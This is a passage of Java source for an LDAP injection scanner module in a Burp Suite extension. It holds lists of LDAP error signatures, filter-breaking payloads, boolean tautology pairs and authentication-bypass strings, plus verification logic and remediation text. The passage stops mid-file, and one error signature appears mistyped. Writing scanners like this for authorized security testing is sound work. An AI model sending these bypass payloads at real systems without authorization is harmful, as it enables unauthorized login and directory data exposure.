package com.omnistrike.modules.injection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.omnistrike.framework.CollaboratorManager;
import com.omnistrike.framework.DeduplicationStore;
import com.omnistrike.framework.FindingsStore;
import com.omnistrike.framework.PayloadEncoder;
import com.omnistrike.framework.ResponseGuard;
import com.omnistrike.model.*;

import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * LDAP Injection Scanner — Detects LDAP filter injection vulnerabilities with
 * strict multi-phase verification to minimize false positives.
 *
 * This module is RIGHT-CLICK ONLY — it is excluded from "Send to OmniStrike
 * (All Modules)" and from auto-scanning. Users must explicitly select it from
 * the context menu.
 *
 * Design philosophy: FALSE NEGATIVES OVER FALSE POSITIVES.
 * LDAP injection lacks strong confirmation channels (no time-based, no OOB from
 * filter context), so this scanner uses conservative multi-round verification:
 *
 * Detection phases (ordered by confidence):
 *
 *  Phase 1: ERROR-BASED — Inject malformed LDAP filter syntax and look for
 *           LDAP-specific error strings in the response. Requires matching
 *           2+ distinct error signatures for FIRM confidence.
 *
 *  Phase 2: BOOLEAN-BASED (2-round) — Inject tautology (always-true) vs
 *           contradiction (always-false) filters and compare response bodies.
 *           Requires BOTH rounds to agree AND baseline stability check to
 *           confirm the difference is caused by the injection, not random
 *           variation (session state, timestamps, CSRF tokens, etc.).
 *
 *  Phase 3: AUTHENTICATION BYPASS — Test login-like endpoints with
 *           wildcard/tautology payloads. Only triggers on parameters
 *           whose names suggest authentication (user, pass, uid, cn, etc.).
 *
 *  Phase 4: WILDCARD AMPLIFICATION — Inject `*` wildcards and compare
 *           response size. A significant size increase suggests the wildcard
 *           expanded to match many entries. Only reported as FIRM when the
 *           size delta exceeds a configurable threshold AND the control
 *           response (impossible value) returns significantly less.
 */
public class LdapInjectionScanner implements ScanModule {

    private MontoyaApi api;
    private ModuleConfig config;
    private DeduplicationStore dedup;
    private FindingsStore findingsStore;
    private CollaboratorManager collaboratorManager;

    // Track parameters confirmed via error-based (skip further phases)
    private final Set<String> confirmedParams = ConcurrentHashMap.newKeySet();

    // ==================== LDAP ERROR SIGNATURES ====================
    // Grouped by LDAP implementation for attribution.
    // Each entry: {errorPattern, implementation, description}
    // Patterns are checked case-insensitively against response body.

    private static final String[][] LDAP_ERROR_SIGNATURES = {
            // OpenLDAP
            {"invalid dn syntax", "OpenLDAP", "Invalid DN syntax error"},
            {"bad search filter", "OpenLDAP", "Malformed search filter"},
            {"filter error", "OpenLDAP", "LDAP filter parsing error"},
            {"ldap_search:", "OpenLDAP", "LDAP search function error"},
            {"ldap_bind:", "OpenLDAP", "LDAP bind function error"},
            {"ldap_modify:", "OpenLDAP", "LDAP modify function error"},
            {"invalid filter", "OpenLDAP", "Invalid LDAP filter"},

            // Microsoft Active Directory / ADSI
            {"ldap provider", "Active Directory", "ADSI LDAP provider error"},
            {"server is unwilling to perform", "Active Directory", "LDAP operation refused"},
            {"invalid attribute syntax", "Active Directory", "AD attribute syntax error"},
            {"object class violation", "Active Directory", "AD object class violation"},
            {"a]referral was returned", "Active Directory", "AD referral returned"},
            {"constraint violation", "Active Directory", "AD constraint violation"},
            {"error in filter", "Active Directory", "AD filter syntax error"},

            // Java JNDI LDAP
            {"javax.naming.namingexception", "Java JNDI", "JNDI naming exception"},
            {"javax.naming.directory", "Java JNDI", "JNDI directory exception"},
            {"javax.naming.invalidnameexception", "Java JNDI", "JNDI invalid name"},
            {"javax.naming.communicationexception", "Java JNDI", "JNDI communication error"},
            {"javax.naming.authenticationexception", "Java JNDI", "JNDI auth exception"},
            {"com.sun.jndi.ldap", "Java JNDI", "Sun JNDI LDAP stack trace"},
            {"ldapexception", "Java JNDI", "LDAP exception class name"},

            // PHP LDAP
            {"ldap_search()", "PHP", "PHP ldap_search error"},
            {"ldap_bind()", "PHP", "PHP ldap_bind error"},
            {"ldap_read()", "PHP", "PHP ldap_read error"},
            {"ldap_list()", "PHP", "PHP ldap_list error"},
            {"ldap_modify()", "PHP", "PHP ldap_modify error"},
            {"ldap_add()", "PHP", "PHP ldap_add error"},
            {"ldap_delete()", "PHP", "PHP ldap_delete error"},
            {"ldap_errno", "PHP", "PHP LDAP error number"},
            {"ldap_err2str", "PHP", "PHP LDAP error-to-string"},

            // Python python-ldap / ldap3
            {"ldap.invalid_dn_syntax", "Python", "Python LDAP invalid DN syntax"},
            {"ldap.filter_error", "Python", "Python LDAP filter error"},
            {"ldap.ldaperror", "Python", "Python LDAP generic error"},
            {"ldap.server_down", "Python", "Python LDAP server down"},
            {"ldap3.core.exceptions", "Python", "Python ldap3 exception"},

            // .NET / C#
            {"system.directoryservices", "C#/.NET", ".NET DirectoryServices error"},
            {"directoryserviceprotocolerror", "C#/.NET", ".NET LDAP protocol error"},
            {"ldapexception", "C#/.NET", ".NET LDAP exception"},
            {"novell.directory.ldap", "C#/.NET", "Novell LDAP library error"},

            // Ruby net-ldap
            {"net::ldap", "Ruby", "Ruby Net::LDAP error"},
            {"ldap::result", "Ruby", "Ruby LDAP result error"},

            // Generic / cross-implementation
            {"invalid ldap", "Generic", "Generic LDAP error"},
            {"ldap error", "Generic", "Generic LDAP error message"},
            {"ldap syntax", "Generic", "LDAP syntax error"},
            {"search filter", "Generic", "Search filter error"},
            {"unbalanced parenthes", "Generic", "Unbalanced parentheses in filter"},
            {"unterminated", "Generic", "Unterminated LDAP filter"},
            {"bad filter", "Generic", "Bad LDAP filter error"},
    };

    // ==================== ERROR TRIGGER PAYLOADS ====================
    // Malformed filter syntax designed to trigger LDAP-specific errors.
    // Each payload breaks LDAP filter grammar in a distinct way.

    private static final String[][] ERROR_PAYLOADS = {
            // Unbalanced parentheses — the #1 most reliable error trigger
            {")(", "Unbalanced close-open parens"},
            {")(cn=*", "Close filter + partial new filter"},
            {")(&", "Close filter + boolean AND operator"},
            {")(|", "Close filter + boolean OR operator"},
            // Deeply broken filter syntax
            {"*)(|(objectClass=*", "Tautology prefix with broken filter"},
            {"*))(|(cn=*", "Double close + new compound filter"},
            {"*))%00", "Double close + null byte"},
            // Invalid characters in filter value (should cause parsing error)
            {"\\", "Lone backslash — invalid escape"},
            {"*)(cn=\\ZZ", "Invalid hex escape sequence"},
            // Unmatched operators
            {")(!(objectClass=*))", "Close + NOT filter + extra close"},
    };

    // ==================== BOOLEAN PAYLOADS ====================
    // True/False pairs for differential response analysis.
    // The true condition should return normal results; the false condition should
    // return empty/different results.
    // Format: {truePayload, falsePayload, description}

    private static final String[][] BOOLEAN_PAIRS = {
            // Wildcard tautology vs impossible value
            {"*)(objectClass=*", "*)(objectClass=zZzNonExistentClass999", "objectClass tautology vs impossible class"},
            // OR tautology vs AND contradiction
            {"*)(|(objectClass=*)", "*)(!(objectClass=*))", "OR-tautology vs NOT-all"},
            // Simple wildcard vs extremely specific impossible value
            {"*", "xX9nOnExIsTeNt8zZ7qQ", "Wildcard vs impossible literal value"},
    };

    // ==================== AUTH BYPASS PAYLOADS ====================
    // Payloads targeting login/authentication endpoints.
    // These attempt to modify the LDAP bind or search filter to bypass auth.

    private static final String[][] AUTH_BYPASS_PAYLOADS = {
            {"*", "Wildcard — match any value"},
            {"*)(uid=*))(|(uid=*", "Filter injection — always-true compound"},
            {"*)(|(password=*)", "OR tautology on password field"},
            {"admin)(&)", "Close filter + boolean AND (admin)"},
            {"*))%00", "Wildcard + close + null byte truncation"},
            {"admin)(|(objectClass=*)", "Admin + OR tautology"},
            {"*)(cn=*))(&(1=0", "Complex compound — confuse parser into accepting"},
    };

    // Parameter names that suggest authentication context (case-insensitive)
    private static final Set<String> AUTH_PARAM_NAMES = Set.of(
            "user", "username", "uname", "login", "uid", "userid", "user_id",
            "pass", "password", "passwd", "pwd", "secret",
            "cn", "sn", "givenname", "mail", "email",
            "dn", "binddn", "bind_dn", "userdn", "user_dn",
            "samaccountname", "userprincipalname",
            "auth", "credential", "credentials"
    );

    // ==================== MODULE INTERFACE ====================

    @Override
    public String getId() { return "ldapi-scanner"; }

    @Override
    public String getName() { return "LDAP Injection Scanner"; }

    @Override
    public String getDescription() {
        return "Detects LDAP filter injection via error-based, boolean differential, "
                + "auth bypass, and wildcard amplification. Right-click only. "
                + "Prioritizes zero false positives over coverage.";
    }

    @Override
    public ModuleCategory getCategory() { return ModuleCategory.INJECTION; }

    @Override
    public boolean isPassive() { return false; }

    @Override
    public void initialize(MontoyaApi api, ModuleConfig config) {
        this.api = api;
        this.config = config;
    }

    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore,
                                 CollaboratorManager collaboratorManager) {
        this.dedup = dedup;
        this.findingsStore = findingsStore;
        this.collaboratorManager = collaboratorManager;
    }

    @Override
    public List<Finding> processHttpFlowForParameter(
            HttpRequestResponse requestResponse, String targetParameterName, MontoyaApi api) {
        int countBefore = findingsStore.getCount();
        HttpRequest request = requestResponse.request();
        String urlPath = extractPath(request.url());
        List<LdapTarget> targets = extractTargets(request);
        targets.removeIf(t -> !t.name.equalsIgnoreCase(targetParameterName));
        runTargets(requestResponse, targets, urlPath);
        return collectNewFindings(countBefore);
    }

    @Override
    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
        int countBefore = findingsStore.getCount();
        HttpRequest request = requestResponse.request();
        String urlPath = extractPath(request.url());
        List<LdapTarget> targets = extractTargets(request);

        api.logging().logToOutput("[LDAPI] processHttpFlow: " + request.url()
                + " | targets: " + targets.size());

        runTargets(requestResponse, targets, urlPath);
        return collectNewFindings(countBefore);
    }

    private List<Finding> collectNewFindings(int countBefore) {
        List<Finding> newFindings = new ArrayList<>();
        List<Finding> all = findingsStore.getAllFindings();
        for (int i = countBefore; i < all.size(); i++) {
            Finding f = all.get(i);
            if ("ldapi-scanner".equals(f.getModuleId())) {
                newFindings.add(f);
            }
        }
        return newFindings;
    }

    private void runTargets(HttpRequestResponse requestResponse,
                             List<LdapTarget> targets, String urlPath) {
        for (LdapTarget target : targets) {
            if (Thread.currentThread().isInterrupted()) return;
            if (!dedup.markIfNew("ldapi-scanner", urlPath, target.name)) {
                api.logging().logToOutput("[LDAPI] Skipping '" + target.name + "' — already tested");
                continue;
            }

            try {
                testLdapInjection(requestResponse, target);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            } catch (Exception e) {
                api.logging().logToError("[LDAPI] Error testing '" + target.name + "': " + e.getMessage());
            }
        }
    }

    // ==================== MAIN TEST FLOW ====================

    private void testLdapInjection(HttpRequestResponse original, LdapTarget target) throws InterruptedException {
        String url = original.request().url();
        String paramKey = url + "|" + target.name;

        api.logging().logToOutput("[LDAPI] Testing param '" + target.name + "' on " + url);

        // Phase 1: Error-based detection (highest confidence)
        if (config.getBool("ldapi.errorBased.enabled", true)) {
            if (testErrorBased(original, target, url)) {
                confirmedParams.add(paramKey);
                return; // Confirmed — skip remaining phases
            }
        }

        // Phase 2: Boolean-based differential (requires 2-round verification)
        if (config.getBool("ldapi.booleanBased.enabled", true)) {
            if (testBooleanBased(original, target, url)) {
                confirmedParams.add(paramKey);
                return;
            }
        }

        // Phase 3: Authentication bypass (only for auth-like parameters)
        if (config.getBool("ldapi.authBypass.enabled", true)) {
            if (isAuthParameter(target.name)) {
                if (testAuthBypass(original, target, url)) {
                    confirmedParams.add(paramKey);
                    return;
                }
            }
        }

        // Phase 4: Wildcard amplification
        if (config.getBool("ldapi.wildcardAmplification.enabled", true)) {
            testWildcardAmplification(original, target, url);
        }
    }

    // ==================== PHASE 1: ERROR-BASED ====================

    /**
     * Sends malformed LDAP filter syntax and checks for LDAP-specific error
     * strings in the response. Requires 2+ distinct error signatures to report
     * as FIRM confidence (single match = not reported).
     *
     * Also requires that the error string was NOT present in the baseline
     * response (to avoid false positives from pages that always show errors).
     */
    private boolean testErrorBased(HttpRequestResponse original, LdapTarget target,
                                    String url) throws InterruptedException {
        api.logging().logToOutput("[LDAPI] Phase 1: Error-based detection for '" + target.name + "'");

        // Get baseline response to compare against
        String baselineBody = original.response() != null ? original.response().bodyToString() : "";
        if (baselineBody == null) baselineBody = "";
        String baselineBodyLower = baselineBody.toLowerCase();

        // Track matched signatures across all error payloads
        Set<String> matchedSignatures = new LinkedHashSet<>();
        Set<String> matchedImplementations = new LinkedHashSet<>();
        HttpRequestResponse bestEvidence = null;
        String bestPayload = null;
        String bestError = null;

        for (String[] errorEntry : ERROR_PAYLOADS) {
            if (Thread.currentThread().isInterrupted()) return false;
            String payload = errorEntry[0];
            String payloadDesc = errorEntry[1];

            HttpRequestResponse result = sendPayload(original, target, payload);
            if (result == null || result.response() == null) continue;

            String body = result.response().bodyToString();
            if (body == null) body = "";
            String bodyLower = body.toLowerCase();

            for (String[] sig : LDAP_ERROR_SIGNATURES) {
                String pattern = sig[0].toLowerCase();
                String impl = sig[1];
                String sigDesc = sig[2];

                // Error must be in response AND not in baseline
                if (bodyLower.contains(pattern) && !baselineBodyLower.contains(pattern)) {
                    matchedSignatures.add(pattern);
                    matchedImplementations.add(impl);
                    if (bestEvidence == null) {
                        bestEvidence = result;
                        bestPayload = payload;
                        bestError = sigDesc + " (" + pattern + ")";
                    }
                }
            }

            perHostDelay();

            // Early exit: 2+ distinct signatures already found
            if (matchedSignatures.size() >= 2) break;
        }

        // Require 2+ distinct error signatures for FIRM confidence
        if (matchedSignatures.size() >= 2 && bestEvidence != null) {
            String implStr = String.join(", ", matchedImplementations);

            findingsStore.addFinding(Finding.builder("ldapi-scanner",
                            "LDAP Injection (Error-Based): " + target.name,
                            Severity.HIGH, Confidence.FIRM)
                    .url(url).parameter(target.name)
                    .evidence("Matched " + matchedSignatures.size() + " LDAP error signatures:"
                            + "\n  Signatures: " + String.join(", ", matchedSignatures)
                            + "\n  Implementation: " + implStr
                            + "\n  Trigger payload: " + bestPayload
                            + "\n  First error: " + bestError)
                    .description("LDAP injection detected via error-based analysis. Malformed LDAP filter "
                            + "syntax injected into parameter '" + target.name + "' triggered "
                            + matchedSignatures.size() + " distinct LDAP-specific error signatures, "
                            + "confirming the input is embedded in an LDAP query without proper "
                            + "sanitization. Detected implementation: " + implStr + ".")
                    .remediation("Use parameterized LDAP queries or LDAP-specific input encoding. "
                            + "Escape special LDAP characters: * ( ) \\ / NUL. "
                            + "In Java, use javax.naming.ldap.Rdn.escapeValue(). "
                            + "In PHP, use ldap_escape(). "
                            + "Never concatenate user input into LDAP filter strings directly. "
                            + "Apply allowlist validation for LDAP attribute values where possible.")
                    .requestResponse(bestEvidence)
                    .payload(bestPayload)
                    .responseEvidence(String.join(", ", matchedSignatures))
                    .build());

            api.logging().logToOutput("[LDAPI] CONFIRMED (Error-Based): param '" + target.name
                    + "' — " + matchedSignatures.size() + " signatures matched");
            return true;
        }

        if (matchedSignatures.size() == 1) {
            api.logging().logToOutput("[LDAPI] Only 1 error signature matched for '" + target.name
                    + "' — not enough confidence, skipping");
        }

        return false;
    }

    // ==================== PHASE 2: BOOLEAN-BASED ====================

    /**
     * Boolean differential analysis: sends true-condition vs false-condition
     * payloads and compares response bodies. Uses 2-round verification:
     *
     * Round 1: true1 vs false1 — measure difference
     * Stability: baseline1 vs baseline2 — measure natural variance
     * Round 2: true2 vs false2 — must agree with round 1
     *
     * Only reports if:
     *  - true responses are similar to each other
     *  - false responses are similar to each other
     *  - true ≠ false (beyond natural variance threshold)
     *  - natural variance (baseline stability) is low
     */
    private boolean testBooleanBased(HttpRequestResponse original, LdapTarget target,
                                      String url) throws InterruptedException {
        api.logging().logToOutput("[LDAPI] Phase 2: Boolean-based detection for '" + target.name + "'");

        // Measure baseline stability: send original value twice
        HttpRequestResponse baseline1 = sendPayload(original, target, target.originalValue);
        perHostDelay();
        HttpRequestResponse baseline2 = sendPayload(original, target, target.originalValue);
        perHostDelay();

        if (baseline1 == null || baseline2 == null
                || baseline1.response() == null || baseline2.response() == null) return false;

        String baseBody1 = baseline1.response().bodyToString();
        if (baseBody1 == null) baseBody1 = "";
        String baseBody2 = baseline2.response().bodyToString();
        if (baseBody2 == null) baseBody2 = "";

        // Calculate baseline variance — if responses differ significantly with the
        // same input, the endpoint is too unstable for boolean-based detection
        double baselineVariance = 1.0 - similarity(baseBody1, baseBody2);
        double varianceThreshold = config.getInt("ldapi.boolean.varianceThreshold", 5) / 100.0;

        if (baselineVariance > varianceThreshold) {
            api.logging().logToOutput("[LDAPI] Baseline too unstable for boolean-based: "
                    + String.format("%.1f%%", baselineVariance * 100) + " variance > "
                    + String.format("%.1f%%", varianceThreshold * 100) + " threshold");
            return false;
        }

        for (String[] pair : BOOLEAN_PAIRS) {
            if (Thread.currentThread().isInterrupted()) return false;
            String truePayload = pair[0];
            String falsePayload = pair[1];
            String pairDesc = pair[2];

            // Round 1
            HttpRequestResponse trueResult1 = sendPayload(original, target, truePayload);
            perHostDelay();
            HttpRequestResponse falseResult1 = sendPayload(original, target, falsePayload);
            perHostDelay();

            if (trueResult1 == null || falseResult1 == null
                    || trueResult1.response() == null || falseResult1.response() == null) continue;

            String trueBody1 = trueResult1.response().bodyToString();
            if (trueBody1 == null) trueBody1 = "";
            String falseBody1 = falseResult1.response().bodyToString();
            if (falseBody1 == null) falseBody1 = "";

            double round1Diff = 1.0 - similarity(trueBody1, falseBody1);

            // Require meaningful difference: true ≠ false beyond baseline variance
            double minDiffThreshold = config.getInt("ldapi.boolean.minDiffPercent", 15) / 100.0;
            if (round1Diff < minDiffThreshold) continue;

            // Also check status codes: if true=200 and false=200, the diff must come from body
            // If status codes differ, that's a stronger signal
            boolean statusDiff = trueResult1.response().statusCode() != falseResult1.response().statusCode();

            // Round 2: repeat to confirm deterministic behavior
            HttpRequestResponse trueResult2 = sendPayload(original, target, truePayload);
            perHostDelay();
            HttpRequestResponse falseResult2 = sendPayload(original, target, falsePayload);
            perHostDelay();

            if (trueResult2 == null || falseResult2 == null
                    || trueResult2.response() == null || falseResult2.response() == null) continue;

            String trueBody2 = trueResult2.response().bodyToString();
            if (trueBody2 == null) trueBody2 = "";
            String falseBody2 = falseResult2.response().bodyToString();
            if (falseBody2 == null) falseBody2 = "";

            double round2Diff = 1.0 - similarity(trueBody2, falseBody2);

            // Round 2 must also show meaningful difference
            if (round2Diff < minDiffThreshold) continue;

            // True responses must be similar to each other (deterministic true path)
            double trueSimilarity = similarity(trueBody1, trueBody2);
            // False responses must be similar to each other (deterministic false path)
            double falseSimilarity = similarity(falseBody1, falseBody2);

            double consistencyThreshold = config.getInt("ldapi.boolean.consistencyPercent", 90) / 100.0;
            if (trueSimilarity < consistencyThreshold || falseSimilarity < consistencyThreshold) {
                api.logging().logToOutput("[LDAPI] Boolean round 2 inconsistent for '" + target.name
                        + "': trueSim=" + String.format("%.1f%%", trueSimilarity * 100)
                        + " falseSim=" + String.format("%.1f%%", falseSimilarity * 100));
                continue;
            }

            // All checks pass — report
            findingsStore.addFinding(Finding.builder("ldapi-scanner",
                            "LDAP Injection (Boolean-Based): " + target.name,
                            Severity.HIGH, Confidence.FIRM)
                    .url(url).parameter(target.name)
                    .evidence("Boolean pair: " + pairDesc
                            + "\n  True payload:  " + truePayload
                            + "\n  False payload: " + falsePayload
                            + "\n  Round 1 diff: " + String.format("%.1f%%", round1Diff * 100)
                            + "\n  Round 2 diff: " + String.format("%.1f%%", round2Diff * 100)
                            + "\n  True consistency:  " + String.format("%.1f%%", trueSimilarity * 100)
                            + "\n  False consistency: " + String.format("%.1f%%", falseSimilarity * 100)
                            + "\n  Baseline variance: " + String.format("%.1f%%", baselineVariance * 100)
                            + "\n  Status code difference: " + statusDiff
                            + "\n  True status:  " + trueResult1.response().statusCode()
                            + "\n  False status: " + falseResult1.response().statusCode())
                    .description("LDAP injection detected via boolean-based differential analysis. "
                            + "Injecting an always-true LDAP filter condition produces a different response "
                            + "than an always-false condition. This was verified over 2 independent rounds "
                            + "with consistent results, confirming the parameter '" + target.name
                            + "' is embedded in an LDAP query.")
                    .remediation("Use parameterized LDAP queries or LDAP-specific input encoding. "
                            + "Escape special LDAP characters: * ( ) \\ / NUL. "
                            + "In Java, use javax.naming.ldap.Rdn.escapeValue(). "
                            + "In PHP, use ldap_escape(). "
                            + "Never concatenate user input into LDAP filter strings.")
                    .requestResponse(trueResult1)
                    .payload(truePayload)
                    .responseEvidence("Boolean differential: true ≠ false")
                    .build());

            api.logging().logToOutput("[LDAPI] CONFIRMED (Boolean-Based): param '" + target.name
                    + "' — " + pairDesc);
            return true;
        }

        return false;
    }

    // ==================== PHASE 3: AUTHENTICATION BYPASS ====================

    /**
     * Tests login-like endpoints by injecting wildcard/tautology payloads into
     * authentication parameters. Reports only when the response clearly changes
     * from "auth failure" to "auth success" pattern.
     */
    private boolean testAuthBypass(HttpRequestResponse original, LdapTarget target,
                                    String url) throws InterruptedException {
        api.logging().logToOutput("[LDAPI] Phase 3: Auth bypass for '" + target.name + "'");

        // Baseline: send a clearly-wrong value to get the "failure" response
        HttpRequestResponse failureBaseline = sendPayload(original, target,
                "xXiMpOsSiBlEvAlUe99ZzQq");
        perHostDelay();

        if (failureBaseline == null || failureBaseline.response() == null) return false;

        int failureStatus = failureBaseline.response().statusCode();
        String failureBody = failureBaseline.response().bodyToString();
        if (failureBody == null) failureBody = "";
        int failureLen = failureBody.length();

        for (String[] authEntry : AUTH_BYPASS_PAYLOADS) {
            if (Thread.currentThread().isInterrupted()) return false;
            String payload = authEntry[0];
            String desc = authEntry[1];

            HttpRequestResponse result = sendPayload(original, target, payload);
            perHostDelay();

            if (result == null || result.response() == null) continue;

            int resultStatus = result.response().statusCode();
            String resultBody = result.response().bodyToString();
            if (resultBody == null) resultBody = "";
            int resultLen = resultBody.length();

            // Auth bypass signals:
            // 1. Status code change: 401/403 → 200/302
            boolean statusBypass = (failureStatus == 401 || failureStatus == 403)
                    && (resultStatus == 200 || resultStatus == 302);

            // 2. Significant response body change (not just CSRF token rotation)
            double bodyDiff = 1.0 - similarity(failureBody, resultBody);
            boolean significantBodyChange = bodyDiff > 0.3;

            // 3. Response contains success indicators absent from failure
            boolean hasSuccessIndicator = false;
            String[] successMarkers = {"welcome", "dashboard", "logout", "profile",
                    "session", "authenticated", "logged in", "home"};
            String resultBodyLower = resultBody.toLowerCase();
            String failureBodyLower = failureBody.toLowerCase();
            for (String marker : successMarkers) {
                if (resultBodyLower.contains(marker) && !failureBodyLower.contains(marker)) {
                    hasSuccessIndicator = true;
                    break;
                }
            }

            // Require at least 2 of the 3 signals for FIRM confidence
            int signals = (statusBypass ? 1 : 0) + (significantBodyChange ? 1 : 0)
                    + (hasSuccessIndicator ? 1 : 0);

            if (signals >= 2) {
                // Verify: repeat the bypass payload to confirm it's deterministic
                HttpRequestResponse verify = sendPayload(original, target, payload);
                perHostDelay();

                if (verify != null && verify.response() != null) {
                    int verifyStatus = verify.response().statusCode();
                    if (verifyStatus != resultStatus) {
                        api.logging().logToOutput("[LDAPI] Auth bypass not reproducible for '"
                                + target.name + "' — skipping");
                        continue;
                    }
                }

                findingsStore.addFinding(Finding.builder("ldapi-scanner",
                                "LDAP Injection (Auth Bypass): " + target.name,
                                Severity.CRITICAL, Confidence.FIRM)
                        .url(url).parameter(target.name)
                        .evidence("Auth bypass payload: " + payload + " (" + desc + ")"
                                + "\n  Failure baseline: HTTP " + failureStatus + " (" + failureLen + " bytes)"
                                + "\n  Bypass result: HTTP " + resultStatus + " (" + resultLen + " bytes)"
                                + "\n  Status change: " + statusBypass
                                + "\n  Body diff: " + String.format("%.1f%%", bodyDiff * 100)
                                + "\n  Success indicator: " + hasSuccessIndicator
                                + "\n  Signals: " + signals + "/3")
                        .description("LDAP injection authentication bypass detected. Injecting '"
                                + payload + "' into parameter '" + target.name + "' changed the response "
                                + "from an authentication failure (HTTP " + failureStatus + ") to what appears "
                                + "to be a successful authentication (HTTP " + resultStatus + "). "
                                + "This suggests the parameter is embedded in an LDAP bind or search filter "
                                + "used for authentication, and the injection modifies the filter to match "
                                + "any/all user accounts.")
                        .remediation("Use parameterized LDAP queries or LDAP-specific input encoding. "
                                + "Escape special LDAP characters before embedding in bind/search filters. "
                                + "Implement multi-factor authentication as defense-in-depth. "
                                + "Use prepared LDAP queries where available.")
                        .requestResponse(result)
                        .payload(payload)
                        .responseEvidence("HTTP " + failureStatus + " → " + resultStatus)
                        .build());

                api.logging().logToOutput("[LDAPI] CONFIRMED (Auth Bypass): param '" + target.name
                        + "' — " + desc);
                return true;
            }
        }

        return false;
    }

    // ==================== PHASE 4: WILDCARD AMPLIFICATION ====================

    /**
     * Tests if injecting `*` causes significantly more LDAP entries to be returned,
     * indicated by a larger response body. Compares against both the original value
     * AND an impossible value (control).
     */
    private void testWildcardAmplification(HttpRequestResponse original, LdapTarget target,
                                            String url) throws InterruptedException {
        api.logging().logToOutput("[LDAPI] Phase 4: Wildcard amplification for '" + target.name + "'");

        // Baseline: original value
        HttpRequestResponse baseline = sendPayload(original, target, target.originalValue);
        perHostDelay();

        // Control: impossible value → should return minimal results
        HttpRequestResponse control = sendPayload(original, target, "xXiMpOsSiBlEvAlUe99ZzQq");
        perHostDelay();

        // Wildcard: * → should return maximum results
        HttpRequestResponse wildcard = sendPayload(original, target, "*");
        perHostDelay();

        if (baseline == null || control == null || wildcard == null
                || baseline.response() == null || control.response() == null
                || wildcard.response() == null) return;

        String _baselineBody = baseline.response().bodyToString();
        if (_baselineBody == null) _baselineBody = "";
        int baselineLen = _baselineBody.length();
        String _controlBody = control.response().bodyToString();
        if (_controlBody == null) _controlBody = "";
        int controlLen = _controlBody.length();
        String _wildcardBody = wildcard.response().bodyToString();
        if (_wildcardBody == null) _wildcardBody = "";
        int wildcardLen = _wildcardBody.length();

        // Wildcard must be significantly larger than both baseline and control
        int minAmplification = config.getInt("ldapi.wildcard.minAmplificationBytes", 500);
        double minRatio = config.getInt("ldapi.wildcard.minRatio", 200) / 100.0; // default 2x

        boolean amplifiedVsBaseline = wildcardLen > baselineLen + minAmplification
                && wildcardLen > baselineLen * minRatio;
        boolean amplifiedVsControl = wildcardLen > controlLen + minAmplification
                && wildcardLen > controlLen * minRatio;

        // Control should be smaller than baseline (no results vs some results)
        boolean controlSmaller = controlLen <= baselineLen;

        if (amplifiedVsBaseline && amplifiedVsControl && controlSmaller) {
            // Verify: repeat wildcard to confirm
            HttpRequestResponse verify = sendPayload(original, target, "*");
            perHostDelay();

            if (verify == null || verify.response() == null) return;
            String _verifyBody = verify.response().bodyToString();
            if (_verifyBody == null) _verifyBody = "";
            int verifyLen = _verifyBody.length();

            // Verification response must be similar size to first wildcard response
            if (Math.abs(verifyLen - wildcardLen) > wildcardLen * 0.1) {
                api.logging().logToOutput("[LDAPI] Wildcard amplification not stable for '"
                        + target.name + "' — " + wildcardLen + " vs " + verifyLen);
                return;
            }

            findingsStore.addFinding(Finding.builder("ldapi-scanner",
                            "LDAP Injection (Wildcard Amplification): " + target.name,
                            Severity.MEDIUM, Confidence.FIRM)
                    .url(url).parameter(target.name)
                    .evidence("Wildcard amplification detected:"
                            + "\n  Baseline ('" + truncate(target.originalValue, 30) + "'): "
                            + baselineLen + " bytes"
                            + "\n  Control ('impossible'): " + controlLen + " bytes"
                            + "\n  Wildcard ('*'): " + wildcardLen + " bytes"
                            + "\n  Verify ('*'): " + verifyLen + " bytes"
                            + "\n  Amplification: " + String.format("%.1fx", (double) wildcardLen / Math.max(1, baselineLen)))
                    .description("The LDAP wildcard character '*' injected into parameter '"
                            + target.name + "' caused a " + String.format("%.1fx",
                            (double) wildcardLen / Math.max(1, baselineLen))
                            + " response size increase compared to the original value, suggesting "
                            + "the wildcard matched additional LDAP entries. The impossible-value "
                            + "control returned " + controlLen + " bytes. This indicates the parameter "
                            + "value is used in an LDAP search filter without proper escaping.")
                    .remediation("Escape the LDAP wildcard character '*' in user input. "
                            + "Use parameterized LDAP queries. "
                            + "Apply allowlist validation for LDAP attribute values.")
                    .requestResponse(wildcard)
                    .payload("*")
                    .responseEvidence("Response: " + wildcardLen + " bytes (baseline: " + baselineLen + ")")
                    .build());

            api.logging().logToOutput("[LDAPI] CONFIRMED (Wildcard Amplification): param '"
                    + target.name + "' — " + wildcardLen + " vs " + baselineLen + " bytes");
        }
    }

    // ==================== SIMILARITY CALCULATION ====================

    /**
     * Calculates body similarity ratio (0.0 = completely different, 1.0 = identical).
     * Strips dynamic tokens (CSRF, nonces, timestamps) before comparison to avoid
     * false variance from session-specific content.
     */
    private double similarity(String a, String b) {
        if (a == null || b == null) return 0.0;

        // Strip common dynamic content that causes false variance
        a = stripDynamicContent(a);
        b = stripDynamicContent(b);

        if (a.equals(b)) return 1.0;
        if (a.isEmpty() || b.isEmpty()) return 0.0;

        // Length-based quick check
        int maxLen = Math.max(a.length(), b.length());
        int minLen = Math.min(a.length(), b.length());
        double lengthRatio = (double) minLen / maxLen;

        // If lengths are vastly different, similarity is low
        if (lengthRatio < 0.5) return lengthRatio;

        // Line-based comparison for content similarity
        String[] linesA = a.split("\n");
        String[] linesB = b.split("\n");
        Set<String> setA = new HashSet<>(Arrays.asList(linesA));
        Set<String> setB = new HashSet<>(Arrays.asList(linesB));

        // Jaccard similarity on unique lines
        Set<String> intersection = new HashSet<>(setA);
        intersection.retainAll(setB);
        Set<String> union = new HashSet<>(setA);
        union.addAll(setB);

        if (union.isEmpty()) return 1.0;
        return (double) intersection.size() / union.size();
    }

    // Patterns for dynamic content that varies between requests
    private static final Pattern CSRF_TOKEN_PATTERN = Pattern.compile(
            "(?:csrf|xsrf|token|nonce|_token|authenticity_token)\\s*[=:]\\s*[\"']?[a-zA-Z0-9+/=_-]{16,}[\"']?",
            Pattern.CASE_INSENSITIVE);
